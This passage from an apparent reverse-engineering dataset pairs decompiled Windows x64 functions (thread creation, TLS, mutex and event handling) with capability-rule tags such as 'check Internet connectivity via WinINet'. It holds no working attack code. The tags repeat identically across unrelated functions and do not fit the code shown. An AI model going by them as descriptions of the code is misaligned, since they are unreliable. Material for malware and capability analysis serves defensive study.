*(iVar6 + 0xb8) = 0;\n    *(iVar6 + 0x28) = 0;\n    uVar7 = (*pcVar2)();\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)();\n    uVar9 = (*pcVar2)();\n    iVar4 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar9, uVar8, uVar7, iVar6 + 0x28, 0, 0, 2);\n    if (iVar4 == 0) goto code_r0x00014001a316;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetThreadPriority)(*(iVar6 + 0x28));\n    *(iVar6 + 0xbc) = 0;\n    *(iVar6 + 0xc0) = uVar3;\n    *(iVar6 + 0x40) = *(iVar6 + 0x40) & 0xcf | 0x10;\n    iVar5 = *piVar1;\n    if (iVar5 == 0) {\n        iVar11 = fcn.1400113f0();\n        iVar5 = *piVar1;\n        if (*(iVar11 + 0x30) != 0) {\n            if (iVar5 == 0) {\n                iVar5 = fcn.1400113f0();\n            }\n            goto code_r0x00014000d27a;\n        }\ncode_r0x00014000d2f0:\n        *(iVar5 + 0x30) = 0x14001b0c8;\n        puVar10 = 0x14001b0c8;\n    }\n    else {\n        if (*(iVar5 + 0x30) == 0) goto code_r0x00014000d2f0;\ncode_r0x00014000d27a:\n        puVar10 = *(iVar5 + 0x30);\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_TlsSetValue)(*puVar10, iVar6);\n    if (iVar4 != 0) {\n        return iVar6;\n    }\ncode_r0x00014001a316:\n    sub.msvcrt.dll_abort();\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 1431
    },
    "14000d52": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14000d520(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    ulong arg1_00;\n    \n    piVar1 = *0x1400d7110;\n    if (arg1 == 0) {\n        return 0;\n    }\n    iVar3 = **0x1400d7110;\n    if (iVar3 == 0) {\n        iVar2 = fcn.1400113f0();\n        iVar3 = *piVar1;\n        if (*(iVar2 + 0x60) != 0) {\n            if (iVar3 == 0) {\n                iVar3 = fcn.1400113f0();\n            }\n            goto code_r0x00014000d5b0;\n        }\ncode_r0x00014000d549:\n        uVar4 = 0x14001b0b8;\n        *(iVar3 + 0x60) = 0x14001b0b8;\n    }\n    else {\n        if (*(iVar3 + 0x60) == 0) goto code_r0x00014000d549;\ncode_r0x00014000d5b0:\n        uVar4 = *(iVar3 + 0x60);\n    }\n    fcn.140011a20(uVar4);\n    uVar4 = fcn.14000aef0(arg1);\n    iVar3 = *piVar1;\n    if (iVar3 == 0) {\n        iVar2 = fcn.1400113f0();\n        iVar3 = *piVar1;\n        if (*(iVar2 + 0x60) == 0) goto code_r0x00014000d5c0;\n        if (iVar3 == 0) {\n            iVar3 = fcn.1400113f0();\n        }\n    }\n    else if (*(iVar3 + 0x60) == 0) {\ncode_r0x00014000d5c0:\n        arg1_00 = 0x14001b0b8;\n        *(iVar3 + 0x60) = 0x14001b0b8;\n        goto code_r0x00014000d577;\n    }\n    arg1_00 = *(iVar3 + 0x60);\ncode_r0x00014000d577:\n    fcn.140011d40(arg1_00);\n    return uVar4;\n}\n",
        "token_count": 540
    },
    "14000d61": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.14000d610(ulong arg1)\n\n{\n    ulong *arg1_00;\n    uint64_t uVar1;\n    int64_t *piVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t *piVar7;\n    ulong uVar8;\n    uint32_t uVar9;\n    uint32_t uStack80;\n    int32_t iStack76;\n    \n    uVar3 = fcn.14000d520(arg1);\n    iStack76 = 0x100;\n    arg1_00 = uVar3 + 0x68;\n    uVar6 = uVar3;\n    if (uVar3 != 0) {\n        do {\n            fcn.1400132a0(arg1_00);\n            piVar2 = *0x1400d7110;\n            if (*(uVar3 + 0x48) == 0) {\n                *arg1_00 = 0xffffffffffffffff;\n                return 0;\n            }\n            uStack80 = 0;\n            uVar6 = 0;\n            do {\n                if (*(*(uVar3 + 0x58) + uVar6) != '\\0') {\n                    uVar8 = *(*(uVar3 + 0x50) + uVar6 * 8);\n                    iVar5 = *piVar2;\n                    if (iVar5 == 0) {\n                        iVar4 = fcn.1400113f0();\n                        iVar5 = *piVar2;\n                        if (*(iVar4 + 0x38) != 0) {\n                            if (iVar5 == 0) {\n                                iVar5 = fcn.1400113f0();\n                            }\n                            goto code_r0x00014000d6d2;\n                        }\ncode_r0x00014000d7b8:\n                        *(iVar5 + 0x38) = 0x14001b0c0;\n                        fcn.140012b10(0x14001b0c0);\n                        iVar5 = *piVar2;\n                        if (iVar5 != 0) goto code_r0x00014000d6e7;\ncode_r0x00014000d7d0:\n                        iVar4 = fcn.1400113f0();\n                        iVar5 = *piVar2;\n                        if (*(iVar4 + 0x10) != 0) {\n                            if (iVar5 == 0) {\n                                iVar5 = fcn.1400113f0();\n                            }\n                            goto code_r0x00014000d6f2;\n                        }\ncode_r0x00014000d7a0:\n                        *(iVar5 + 0x10) = 0x1400ee0a8;\n                        piVar7 = 0x1400ee0a8;\n                    }\n                    else {\n                        if (*(iVar5 + 0x38) == 0) goto code_r0x00014000d7b8;\ncode_r0x00014000d6d2:\n                        fcn.140012b10(*(iVar5 + 0x38));\n                        iVar5 = *piVar2;\n                        if (iVar5 == 0) goto code_r0x00014000d7d0;\ncode_r0x00014000d6e7:\n                        if (*(iVar5 + 0x10) == 0) goto code_r0x00014000d7a0;\ncode_r0x00014000d6f2:\n                        piVar7 = *(iVar5 + 0x10);\n                    }\n                    uVar1 = *(*piVar7 + uVar6 * 8);\n                    *(uVar6 * 8 + *(uVar3 + 0x50)) = 0;\n                    *(*(uVar3 + 0x58) + uVar6) = 0;\n                    if (uVar1 < 2) {\n                        iVar5 = *piVar2;\n                        if (iVar5 == 0) goto code_r0x00014000d761;\ncode_r0x00014000d67c:\n                        if (*(iVar5 + 0x38) != 0) goto code_r0x00014000d687;\ncode_r0x00014000d790:\n                        *(iVar5 + 0x38) = 0x14001b0c0;\n                        uVar8 = 0x14001b0c0;\n                    }\n                    else {\n                        fcn.1400132e0(arg1_00);\n                        iVar5 = *piVar2;\n                        if (iVar5 == 0) {\n                            iVar4 = fcn.1400113f0();\n                            iVar5 = *piVar2;\n                            if (*(iVar4 + 0x10) != 0) {\n                                if (iVar5 == 0) {\n                                    iVar5 = fcn.1400113f0();\n                                }\n                                goto code_r0x00014000d737;\n                            }\ncode_r0x00014000d828:\n                            *(iVar5 + 0x10) = 0x1400ee0a8;\n                            piVar7 = 0x1400ee0a8;\n                        }\n                        else {\n                            if (*(iVar5 + 0x10) == 0) goto code_r0x00014000d828;\ncode_r0x00014000d737:\n                            piVar7 = *(iVar5 + 0x10);\n                        }\n                        (**(*piVar7 + uVar6 * 8))(uVar8);\n                        fcn.1400132a0(arg1_00);\n                        iVar5 = *piVar2;\n                        uStack80 = 1;\n                        if (iVar5 != 0) goto code_r0x00014000d67c;\ncode_r0x00014000d761:\n                        iVar4 = fcn.1400113f0();\n                        iVar5 = *piVar2;\n                        if (*(iVar4 + 0x38) == 0) goto code_r0x00014000d790;\n                        if (iVar5 == 0) {\n                            iVar5 = fcn.1400113f0();\n                        }\ncode_r0x00014000d687:\n                        uVar8 = *(iVar5 + 0x38);\n                    }\n                    fcn.140012e80(uVar8);\n                }\n                uVar9 = uVar6 + 1;\n                uVar6 = uVar9;\n            } while (uVar9 < *(uVar3 + 0x48));\n            fcn.1400132e0(arg1_00);\n            uVar6 = uStack80;\n            if (uStack80 == 0) {\n                return uVar6;\n            }\n            iStack76 = iStack76 + -1;\n        } while (iStack76 != 0);\n    }\n    return uVar6;\n}\n",
        "token_count": 1493
    },
    "14000dc2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14000dc20(uint *param_1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    int32_t *arg1;\n    ulong arg1_00;\n    ulong var_10h;\n    \n    fcn.14000a1b0();\n    piVar2 = *0x1400d7110;\n    iVar6 = **0x1400d7110;\n    if (iVar6 == 0) {\n        iVar7 = fcn.1400113f0();\n        iVar6 = *piVar2;\n        if (*(iVar7 + 0x60) == 0) goto code_r0x00014000dc53;\n        if (iVar6 == 0) {\n            iVar6 = fcn.1400113f0();\n        }\ncode_r0x00014000de87:\n        uVar8 = *(iVar6 + 0x60);\n    }\n    else {\n        if (*(iVar6 + 0x60) != 0) goto code_r0x00014000de87;\ncode_r0x00014000dc53:\n        uVar8 = 0x14001b0b8;\n        *(**0x1400d7110 + 0x60) = 0x14001b0b8;\n    }\n    fcn.140011a20(uVar8);\n    fcn.140011a20(param_1 + 0xe);\n    piVar2 = *0x1400d7110;\n    iVar6 = **0x1400d7110;\n    if (iVar6 == 0) {\n        iVar7 = fcn.1400113f0();\n        iVar6 = *piVar2;\n        if (*(iVar7 + 0x28) == 0) goto code_r0x00014000dc9b;\n        if (iVar6 != 0) goto code_r0x00014000de90;\n        iVar6 = fcn.1400113f0();\n        arg1 = *(iVar6 + 0x28);\n        if (*arg1 != 1) goto code_r0x00014000dcb9;\ncode_r0x00014000dcbe:\n        piVar2 = *0x1400d7110;\n        iVar6 = **0x1400d7110;\n        if (iVar6 != 0) goto code_r0x00014000dcd1;\n        iVar7 = fcn.1400113f0();\n        iVar6 = *piVar2;\n        if (*(iVar7 + 0x30) == 0) goto code_r0x00014000dcdc;\n        if (iVar6 == 0) {\n            iVar6 = fcn.1400113f0();\n        }\ncode_r0x00014000dea3:\n        puVar5 = *(iVar6 + 0x30);\n    }\n    else {\n        if (*(iVar6 + 0x28) == 0) {\ncode_r0x00014000dc9b:\n            arg1 = 0x1400ee098;\n            *(**0x1400d7110 + 0x28) = 0x1400ee098;\n        }\n        else {\ncode_r0x00014000de90:\n            arg1 = *(iVar6 + 0x28);\n        }\n        if (*arg1 != 1) {\ncode_r0x00014000dcb9:\n            fcn.14000c6e0(arg1);\n            goto code_r0x00014000dcbe;\n        }\n        iVar6 = **0x1400d7110;\ncode_r0x00014000dcd1:\n        if (*(iVar6 + 0x30) != 0) {\n            iVar6 = **0x1400d7110;\n            goto code_r0x00014000dea3;\n        }\ncode_r0x00014000dcdc:\n        puVar5 = 0x14001b0c8;\n        *(**0x1400d7110 + 0x30) = 0x14001b0c8;\n    }\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*puVar5, param_1);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    param_1[0x1c] = uVar3;\n    fcn.140011d40(param_1 + 0xe);\n    iVar4 = sub.msvcrt.dll__setjmp(param_1 + 0x34, &stack0xfffffffffffffff8);\n    piVar2 = *0x1400d7110;\n    if (iVar4 == 0) {\n        iVar6 = **0x1400d7110;\n        if (iVar6 == 0) {\n            iVar7 = fcn.1400113f0();\n            iVar6 = *piVar2;\n            if (*(iVar7 + 0x60) == 0) goto code_r0x00014000dd4b;\n            if (iVar6 == 0) {\n                iVar6 = fcn.1400113f0();\n            }\ncode_r0x00014000df64:\n            uVar8 = *(iVar6 + 0x60);\n        }\n        else {\n            if (*(iVar6 + 0x60) != 0) goto code_r0x00014000df64;\ncode_r0x00014000dd4b:\n            uVar8 = 0x14001b0b8;\n            *(iVar6 + 0x60) = 0x14001b0b8;\n        }\n        fcn.140011d40(uVar8);\n        if (*(param_1 + 4) == NULL) {\n            uVar8 = 0x80;\n        }\n        else {\n            uVar8 = (**(param_1 + 4))(*(param_1 + 2));\n        }\n        piVar2 = *0x1400d7110;\n        iVar6 = **0x1400d7110;\n        if (iVar6 == 0) {\n            iVar7 = fcn.1400113f0();\n            iVar6 = *piVar2;\n            if (*(iVar7 + 0x60) == 0) goto code_r0x00014000dd9a;\n            if (iVar6 == 0) {\n                iVar6 = fcn.1400113f0();\n            }\ncode_r0x00014000dfb0:\n            arg1_00 = *(iVar6 + 0x60);\n        }\n        else {\n            if (*(iVar6 + 0x60) != 0) goto code_r0x00014000dfb0;\ncode_r0x00014000dd9a:\n            arg1_00 = 0x14001b0b8;\n            *(iVar6 + 0x60) = 0x14001b0b8;\n        }\n        fcn.140011a20(arg1_00);\n        *(param_1 + 2) = uVar8;\n        if (*(param_1 + 0x76) != 0) {\n            fcn.14000d610(*(param_1 + 0x76));\n        }\n    }\n    else {\n        iVar6 = **0x1400d7110;\n        if (iVar6 == 0) {\n            iVar7 = fcn.1400113f0();\n            iVar6 = *piVar2;\n            if (*(iVar7 + 0x60) == 0) goto code_r0x00014000df25;\n            if (iVar6 == 0) {\n                iVar6 = fcn.1400113f0();\n            }\ncode_r0x00014000df89:\n            uVar8 = *(iVar6 + 0x60);\n        }\n        else {\n            if (*(iVar6 + 0x60) != 0) goto code_r0x00014000df89;\ncode_r0x00014000df25:\n            uVar8 = 0x14001b0b8;\n            *(**0x1400d7110 + 0x60) = 0x14001b0b8;\n        }\n        fcn.140011a20(uVar8);\n    }\n    puVar5 = param_1 + 0xe;\n    fcn.140011a20(puVar5);\n    uVar1 = *(param_1 + 2);\n    if (*(param_1 + 0xc) != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    *(param_1 + 0xc) = 0;\n    if (*(param_1 + 10) != 0) {\n        fcn.140011d40(puVar5);\n        fcn.140011f10(puVar5);\n        *(param_1 + 0xe) = 0xffffffffffffffff;\n        param_1[0x2f] = 1;\n        piVar2 = *0x1400d7110;\n        goto code_r0x00014000de35;\n    }\n    *param_1 = 0xdeadbeef;\n    fcn.140011d40(puVar5);\n    fcn.140011f10(puVar5);\n    fcn.14000d0b0(param_1);\n    piVar2 = *0x1400d7110;\n    iVar6 = **0x1400d7110;\n    if (iVar6 == 0) {\n        iVar7 = fcn.1400113f0();\n        iVar6 = *piVar2;\n        if (*(iVar7 + 0x30) == 0) goto code_r0x00014000e036;\n        if (iVar6 == 0) {\n            iVar6 = fcn.1400113f0();\n        }\ncode_r0x00014000e070:\n        puVar5 = *(iVar6 + 0x30);\n    }\n    else {\n        if (*(iVar6 + 0x30) != 0) goto code_r0x00014000e070;\ncode_r0x00014000e036:\n        *(iVar6 + 0x30) = 0x14001b0c8;\n        puVar5 = 0x14001b0c8;\n    }\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*puVar5, 0);\n    piVar2 = *0x1400d7110;\ncode_r0x00014000de35:\n    do {\n        iVar6 = *piVar2;\n        if (iVar6 == 0) {\n            iVar7 = fcn.1400113f0();\n            iVar6 = *piVar2;\n            if (*(iVar7 + 0x60) == 0) goto code_r0x00014000dfcb;\n            if (iVar6 == 0) {\n                iVar6 = fcn.1400113f0();\n            }\n        }\n        else if (*(iVar6 + 0x60) == 0) goto code_r0x00014000dfcb;\n        uVar8 = *(iVar6 + 0x60);\n        while (iVar4 = fcn.140011d40(uVar8),  iVar4 != 0) {\n            iVar6 = (*_sym.imp.msvcrt.dll__endthreadex)(uVar1 & 0xffffffff);\ncode_r0x00014000dfcb:\n            *(iVar6 + 0x60) = 0x14001b0b8;\n            uVar8 = 0x14001b0b8;\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(0);\n    } while( true );\n}\n",
        "token_count": 2573
    },
    "14000f8f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14000f8f0(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    uint *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    uint *unaff_R12;\n    \n    piVar1 = fcn.14000d0d0();\n    piVar1[1] = arg1;\n    if (piVar1[0x3b] != 0) {\n        fcn.14000d610(piVar1[0x3b]);\n    }\n    if ((*(piVar1 + 8) & 0x30) == 0) {\n        piVar5 = piVar1 + 0x1a;\n        puVar2 = (*_sym.imp.msvcrt.dll_longjmp)(piVar5, 1);\n        goto code_r0x00014000f9ca;\n    }\n    iVar3 = **0x1400d7110;\n    piVar1 = *0x1400d7110;\n    if (iVar3 == 0) goto code_r0x00014000f999;\n    if (*(iVar3 + 0x30) != 0) goto code_r0x00014000f9b2;\ncode_r0x00014000f939:\n    puVar2 = 0x14001b0c8;\n    *(*piVar1 + 0x30) = 0x14001b0c8;\n    do {\n        puVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*puVar2);\n        if (puVar2 != NULL) {\n            piVar5 = *(puVar2 + 0xc);\n            unaff_R12 = puVar2;\n            if (*(puVar2 + 10) == 0) {\ncode_r0x00014000f9ca:\n                *puVar2 = 0xdeadbeef;\n                if (piVar5 != NULL) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                }\n                *(unaff_R12 + 0xc) = 0;\n                fcn.14000d0b0(unaff_R12);\n                iVar3 = *piVar1;\n                if (iVar3 == 0) {\n                    iVar4 = fcn.1400113f0();\n                    iVar3 = *piVar1;\n                    if (*(iVar4 + 0x30) == 0) goto code_r0x00014000fa00;\ncode_r0x00014000fa78:\n                    if (iVar3 == 0) {\n                        iVar3 = fcn.1400113f0();\n                    }\n                }\n                else if (*(iVar3 + 0x30) == 0) {\ncode_r0x00014000fa00:\n                    *(iVar3 + 0x30) = 0x14001b0c8;\n                    puVar2 = 0x14001b0c8;\n                    goto code_r0x00014000fa0e;\n                }\ncode_r0x00014000fa50:\n                puVar2 = *(iVar3 + 0x30);\n            }\n            else {\n                puVar2[0x2f] = 1;\n                if (piVar5 != NULL) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                }\n                *(puVar2 + 0xc) = 0;\n                if ((*(puVar2 + 0x11) & 4) == 0) goto code_r0x00014000f990;\n                *puVar2 = 0xdeadbeef;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(*(puVar2 + 10));\n                *(puVar2 + 10) = 0;\n                fcn.14000d0b0(puVar2);\n                iVar3 = *piVar1;\n                if (iVar3 == 0) {\n                    iVar3 = fcn.1400113f0();\n                    if (*(iVar3 + 0x30) != 0) {\n                        iVar3 = *piVar1;\n                        goto code_r0x00014000fa78;\n                    }\n                }\n                else if (*(iVar3 + 0x30) != 0) goto code_r0x00014000fa50;\n                puVar2 = 0x14001b0c8;\n                *(*piVar1 + 0x30) = 0x14001b0c8;\n            }\ncode_r0x00014000fa0e:\n            (*_sym.imp.KERNEL32.dll_TlsSetValue)(*puVar2, 0);\n        }\ncode_r0x00014000f990:\n        (*_sym.imp.msvcrt.dll__endthreadex)();\ncode_r0x00014000f999:\n        iVar3 = fcn.1400113f0();\n        if (*(iVar3 + 0x30) == 0) goto code_r0x00014000f939;\n        iVar3 = *piVar1;\n        if (iVar3 == 0) {\n            iVar3 = fcn.1400113f0();\n        }\ncode_r0x00014000f9b2:\n        puVar2 = *(iVar3 + 0x30);\n    } while( true );\n}\n",
        "token_count": 1144
    },
    "14000faa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.14000faa0(void)\n\n{\n    int64_t *piVar1;\n    int32_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    piVar1 = *0x1400d7110;\n    iVar3 = **0x1400d7110;\n    if (iVar3 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar3 = *piVar1;\n        if (*(iVar4 + 0x18) == 0) goto code_r0x00014000fabb;\n        if (iVar3 == 0) {\n            iVar3 = fcn.1400113f0();\n        }\n    }\n    else if (*(iVar3 + 0x18) == 0) {\ncode_r0x00014000fabb:\n        *(iVar3 + 0x18) = 0x1400ee0a0;\n        piVar2 = 0x1400ee0a0;\n        goto code_r0x00014000fac9;\n    }\n    piVar2 = *(iVar3 + 0x18);\ncode_r0x00014000fac9:\n    if ((((*piVar2 != 0) && (iVar3 = fcn.14000d0d0(),  iVar3 != 0)) && (*(iVar3 + 0x20) < 1)) &&\n       ((*(iVar3 + 0x40) & 3) != 0)) {\n        return *(iVar3 + 0x44) & 1;\n    }\n    return 0;\n}\n",
        "token_count": 352
    },
    "14000fb7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14000fb70(void)\n\n{\n    int64_t *piVar1;\n    code **ppcVar2;\n    int32_t *piVar3;\n    int64_t iVar4;\n    \n    ppcVar2 = fcn.14000d0d0();\n    *(ppcVar2 + 8) = *(ppcVar2 + 8) & 0xf3 | 4;\n    fcn.14000fb30(1);\n    piVar1 = *0x1400d7110;\n    iVar4 = **0x1400d7110;\n    if (iVar4 == 0) goto code_r0x00014000fbf0;\n    if (*(iVar4 + 0x18) != 0) goto code_r0x00014000fc09;\n    do {\n        piVar3 = 0x1400ee0a0;\n        *(*piVar1 + 0x18) = 0x1400ee0a0;\n        while( true ) {\n            LOCK();\n            *piVar3 = *piVar3 + -1;\n            for (ppcVar2 = ppcVar2[3]; ppcVar2 != NULL; ppcVar2 = ppcVar2[2]) {\n                (**ppcVar2)();\n            }\n            fcn.14000fb30(0);\n            fcn.14000f8f0(0xdeadbeef);\ncode_r0x00014000fbf0:\n            iVar4 = fcn.1400113f0();\n            if (*(iVar4 + 0x18) == 0) break;\n            iVar4 = *piVar1;\n            if (iVar4 == 0) {\n                iVar4 = fcn.1400113f0();\n            }\ncode_r0x00014000fc09:\n            piVar3 = *(iVar4 + 0x18);\n        }\n    } while( true );\n}\n",
        "token_count": 419
    },
    "14000fc7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * fcn.14000fc70(void)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int64_t iVar5;\n    int32_t *piVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    int32_t **arg1;\n    uint64_t arg2;\n    \n    piVar4 = fcn.14000d0d0();\n    piVar1 = *0x1400d7110;\n    if (piVar4 == NULL) {\n        return NULL;\n    }\n    if ((*(piVar4 + 0x10) & 0xc) != 0) {\n        return piVar4;\n    }\n    iVar8 = **0x1400d7110;\n    if (iVar8 == 0) {\n        iVar5 = fcn.1400113f0();\n        iVar8 = *piVar1;\n        if (*(iVar5 + 0x18) == 0) goto code_r0x00014000fd00;\n        if (iVar8 == 0) {\n            iVar8 = fcn.1400113f0();\n        }\ncode_r0x00014000fca1:\n        piVar6 = *(iVar8 + 0x18);\n    }\n    else {\n        if (*(iVar8 + 0x18) != 0) goto code_r0x00014000fca1;\ncode_r0x00014000fd00:\n        *(iVar8 + 0x18) = 0x1400ee0a0;\n        piVar6 = 0x1400ee0a0;\n    }\n    if (*piVar6 == 0) {\n        return piVar6;\n    }\n    arg1 = piVar4 + 0xe;\n    fcn.140011a20(arg1);\n    if ((((*(piVar4 + 0x10) & 3) == 0) || ((piVar4[0x11] & 1U) == 0)) || (0 < piVar4[8])) {\n        piVar4 = *arg1;\n        if (piVar4 + 3U < 4) {\n            piVar4 = fcn.1400119a0(arg1, piVar4);\n        }\n        if (piVar4 == NULL) {\n            return 0xc;\n        }\n        if (piVar4[1] != 0) {\n            if (*piVar4 == 0) {\n                return 0x16;\n            }\n            iVar3 = piVar4[5];\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar3 != iVar2) {\n                return 0x1;\n            }\n            if (piVar4[4] != 0) {\n                piVar4[4] = piVar4[4] + -1;\n                return NULL;\n            }\n            piVar4[5] = -1;\n        }\n        iVar3 = *piVar4;\n        *piVar4 = 0;\n        piVar6 = NULL;\n        if (iVar3 == 2) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(piVar4 + 2));\n            piVar6 = iVar3 == 0;\n        }\n        return piVar6;\n    }\n    piVar4[0x11] = piVar4[0x11] & 0xfffffffe;\n    *(piVar4 + 0x10) = *(piVar4 + 0x10) & 0xf3 | 4;\n    if (*(piVar4 + 0xc) != 0) {\n        (*_sym.imp.KERNEL32.dll_ResetEvent)();\n    }\n    fcn.140011d40(arg1);\n    fcn.14000fb70();\n    if (arg1 == NULL) {\n        fcn.14000d0d0();\ncode_r0x00014000fdad:\n        fcn.14000fc70();\n        (*_sym.imp.KERNEL32.dll_Sleep)(0);\n        fcn.14000fc70();\n        return NULL;\n    }\n    uVar7 = fcn.140011790(arg1);\n    if (uVar7 < 0xffffffff) {\n        iVar8 = fcn.14000d0d0();\n        arg2 = uVar7 & 0xffffffff;\n        if (uVar7 == 0) goto code_r0x00014000fdad;\n        fcn.14000fc70();\n        iVar8 = *(iVar8 + 0x30);\n    }\n    else {\n        iVar8 = fcn.14000d0d0();\n        arg2 = 0xffffffff;\n        fcn.14000fc70();\n        iVar8 = *(iVar8 + 0x30);\n    }\n    if (iVar8 == 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(arg2);\n    }\n    else {\n        fcn.140011850(iVar8, arg2);\n    }\n    fcn.14000fc70();\n    return NULL;\n}\n",
        "token_count": 1116
    },
    "140011a2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140011a20(int32_t **arg1)\n\n{\n    uint64_t *puVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *arg2;\n    ulong uVar6;\n    uint64_t uVar7;\n    \n    arg2 = *arg1;\n    if (arg2 + 3U < 4) {\n        arg2 = fcn.1400119a0(arg1, arg2);\n    }\n    if (arg2 == NULL) {\n        return 0xc;\n    }\n    iVar4 = *arg2;\n    *arg2 = 1;\n    if (iVar4 != 0) {\n        if ((arg2[1] != 0) && (iVar2 = arg2[5],  iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)(),  iVar2 == iVar5)\n           ) {\n            LOCK();\n            if (*arg2 == 1) {\n                *arg2 = iVar4;\n            }\n            if (arg2[1] == 2) {\n                arg2[4] = arg2[4] + 1;\n                return 0;\n            }\n            return 0x24;\n        }\n        if (*(arg2 + 2) == 0) {\n            uVar7 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n            if (uVar7 == 0) {\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar4 != 5) {\n                    return 0xc;\n                }\n                return 1;\n            }\n            LOCK();\n            puVar1 = arg2 + 2;\n            uVar3 = *puVar1;\n            *puVar1 = *puVar1 ^ (uVar3 == 0) * (*puVar1 ^ uVar7);\n            if (uVar3 != 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            }\n        }\n        while (iVar4 = *arg2,  *arg2 = 2,  iVar4 != 0) {\n            iVar4 = fcn.140011850(*(arg2 + 2), 0xffffffff);\n            if (iVar4 != 0) {\n                uVar6 = 0x16;\n                if (iVar4 == 0x102) {\n                    uVar6 = 0x8a;\n                }\n                return uVar6;\n            }\n        }\n    }\n    if (arg2[1] == 0) {\n        return 0;\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    arg2[5] = iVar4;\n    return 0;\n}\n",
        "token_count": 609
    },
    "140011b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
